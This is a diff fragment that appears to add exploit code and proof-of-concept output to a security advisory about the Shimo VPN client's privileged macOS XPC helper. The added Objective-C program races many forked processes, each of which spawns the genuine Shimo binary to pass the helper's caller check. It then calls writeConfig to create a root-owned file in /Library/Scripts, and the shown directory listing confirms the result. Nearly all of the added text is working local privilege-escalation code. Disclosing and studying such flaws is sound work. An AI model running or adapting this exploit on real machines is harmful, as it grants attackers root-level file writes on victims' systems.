@@ -80,8 +80,119 @@ Vulnerable method:
 
 ```
 
-Once the 
+## Exploit code:
+```
+#import <Foundation/Foundation.h>
+#include <spawn.h>
+#include <signal.h>
 
+// gcc -framework Foundation -framework Security shimo.m -o shimo
+
+static NSString* XPCHelperMachServiceName = @"com.feingeist.shimo.helper";
+
+@protocol ShimoHelperToolProtocol
+- (void)setTimeMachineEnabled:(BOOL)arg1 withReply:(void (^)(NSError *))arg2;
+- (void)runVpncScript:(NSString *)arg1 withReason:(NSString *)arg2 withReply:(void (^)(NSError *))arg3;
+- (void)cleanSystem:(unsigned long long)arg1 withReply:(void (^)(NSError *))arg2;
+- (void)cleanKnownHostsForRemoteHost:(NSString *)arg1 withReply:(void (^)(NSError *))arg2;
+- (void)unloadKernelExtensions:(unsigned long long)arg1 withReply:(void (^)(NSError *))arg2;
+- (void)loadKernelExtensions:(unsigned long long)arg1 withReply:(void (^)(NSError *))arg2;
+- (void)configureRoutingWithCommand:(NSString *)arg1 withReply:(void (^)(NSError *, NSString *))arg2;
+- (void)terminateRacoonDaemonWithReply:(void (^)(NSError *))arg1;
+- (void)reloadRacoonConfigWithReply:(void (^)(NSError *))arg1;
+- (void)updateNameServerAddresses:(NSArray *)arg1 searchDomains:(NSArray *)arg2 defaultDomain:(NSString *)arg3 forServiceIdentifier:(NSString *)arg4 withReply:(void (^)(NSError *))arg5;
+- (void)deleteConfigAtPath:(NSString *)arg1 withReply:(void (^)(NSError *))arg2;
+- (void)writeConfig:(NSString *)arg1 atPath:(NSString *)arg2 withReply:(void (^)(NSError *))arg3;
+- (void)disconnectService:(long long)arg1 fromRemoteHost:(NSString *)arg2 withComPort:(unsigned long long)arg3 withPID:(int)arg4 withReply:(void (^)(NSError *))arg5;
+- (void)connectOpenConnectWithConfig:(NSString *)arg1 toHost:(NSString *)arg2 withCredentials:(NSString *)arg3 withHash:(NSString *)arg4 withComPort:(unsigned long long)arg5 withReply:(void (^)(NSError *, int))arg6;
+- (void)connectRacoonToHost:(NSString *)arg1 withCredentials:(NSDictionary *)arg2 withComPort:(unsigned long long)arg3 withReply:(void (^)(NSError *, int))arg4;
+- (void)connectSSHWithConfig:(NSString *)arg1 toHost:(NSString *)arg2 withCredentials:(NSString *)arg3 withComPort:(unsigned long long)arg4 withReply:(void (^)(NSError *, int))arg5;
+- (void)connectPPPWithConfig:(NSString *)arg1 withCredentials:(NSDictionary *)arg2 withComPort:(unsigned long long)arg3 requiresRacoon:(BOOL)arg4 withReply:(void (^)(NSError *, int))arg5;
+- (void)connectVPNCWithConfig:(NSString *)arg1 withComPort:(unsigned long long)arg2 withReply:(void (^)(NSError *, int))arg3;
+- (void)connectOpenVPNWithConfig:(NSString *)arg1 withManagementPort:(unsigned long long)arg2 withReply:(void (^)(NSError *, NSString *))arg3;
+- (void)setTmpDirPath:(NSString *)arg1;
+- (void)setShimoBundlePath:(NSString *)arg1;
+@end
+
+int main(void) {
+
+    #define RACE_COUNT 10
+    #define kValid "/Applications/Shimo 2.app/Contents/MacOS/Shimo" // HERE
+    extern char **environ;
+
+    int pids[RACE_COUNT];
+    for (int i = 0; i < RACE_COUNT; i++)
+    {
+        int pid = fork();
+        if (pid == 0)
+        {
+        NSString*  _serviceName = XPCHelperMachServiceName;
+        NSXPCConnection* _agentConnection = [[NSXPCConnection alloc] initWithMachServiceName:_serviceName options:4096];
+        [_agentConnection setRemoteObjectInterface:[NSXPCInterface interfaceWithProtocol:@protocol(ShimoHelperToolProtocol)]];
+        [_agentConnection resume];
+
+        id obj = [_agentConnection remoteObjectProxyWithErrorHandler:^(NSError* error)
+         {
+             (void)error;
+             NSLog(@"Connection Failure");
+         }];
+        NSLog(@"obj: %@", obj);
+        NSLog(@"conn: %@", _agentConnection);
+        //get FW state
+        NSString* sudo_config = @"teststring";
+        NSString* sudo_path = @"/Library/Scripts/poc.sh";
+        // - (void)writeConfig:(NSString *)arg1 atPath:(NSString *)arg2 withReply:(void (^)(NSError *))arg3;
+
+
+        [obj writeConfig:sudo_config atPath:sudo_path withReply:^(NSError * err){
+             NSLog(@"Response: %@", err);
+                 }];
+ 
+        NSLog(@"Done");
+        char target_binary[] = kValid;
+        char *target_argv[] = {target_binary, NULL};
+        posix_spawnattr_t attr;
+        posix_spawnattr_init(&attr);
+        short flags;
+        posix_spawnattr_getflags(&attr, &flags);
+        flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
+        posix_spawnattr_setflags(&attr, flags);
+        posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
+        }
+        printf("forked %d\n", pid);
+        pids[i] = pid;
+    }
+    // keep the children alive
+    sleep(10);
+    
+    cleanup:
+    for (int i = 0; i < RACE_COUNT; i++)
+    {
+        pids[i] && kill(pids[i], 9);
+    }
+}
+```
+
+
+
+
+## POC
+Once the exploit code is executed a file poc.sh has been created
+```
+user@catalina1 exploit % ls -la /Library/Scripts
+total 8
+drwxr-xr-x  11 root  wheel   352 Apr  1 04:40 .
+drwxr-xr-x  66 root  wheel  2112 Aug 30  2021 ..
+drwxr-xr-x  10 root  wheel   320 Aug 24  2019 ColorSync
+drwxr-xr-x  15 root  wheel   480 Aug 24  2019 Folder Action Scripts
+drwxr-xr-x   6 root  wheel   192 Aug 24  2019 Folder Actions
+drwxr-xr-x   7 root  wheel   224 Sep  3  2019 Font Book
+drwxr-xr-x   8 root  wheel   256 Aug 24  2019 Printing Scripts
+drwxr-xr-x  14 root  wheel   448 Aug 24  2019 Script Editor Scripts
+drwxr-xr-x   7 root  wheel   224 Aug 24  2019 UI Element Scripts
+drwxr-xr-x   5 root  wheel   160 Sep 10  2019 VoiceOver
+-rw-r--r--@  1 root  wheel    10 Apr  1 04:40 poc.sh
+```
 
 
 ## Recommendation 
